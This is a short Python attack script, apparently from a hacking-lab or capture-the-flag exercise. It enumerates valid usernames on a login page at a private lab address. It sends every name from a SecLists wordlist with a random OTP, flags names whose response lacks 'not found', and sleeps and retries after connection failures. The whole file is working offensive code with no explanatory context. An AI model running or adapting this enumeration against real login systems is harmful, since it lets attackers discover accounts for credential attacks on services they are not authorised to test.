#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

import random
import requests
import time
import json

debug = False


if debug:
    host = '127.0.0.1:8181'
    dictfile = '/usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'
else:
    host = '10.10.10.122'
    dictfile = '/usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'


endp = '/login.php'
finaluri = 'http://' + host + endp

postparam = {"inputUsername": None, "inputOTP": None}

f = open(dictfile, 'r')

usrname = f.readline().strip()
while usrname != '':
    postparam["inputUsername"] = usrname
    postparam["inputOTP"] = str(random.randint(10000000, 99999999))
    sess = requests.session()
    # print("- [+] Payload: " + json.dumps(postparam))
    try:
        sess.get('http://' + host + '/')
        r = sess.post(finaluri, data=postparam)
        if 'not found' in r.text.lower():
            pass
        else:
            print("- [+] Username: " + postparam["inputUsername"])
        usrname = f.readline().strip()
    except requests.exceptions.ConnectionError as ce:
        time.sleep(300)
        continue
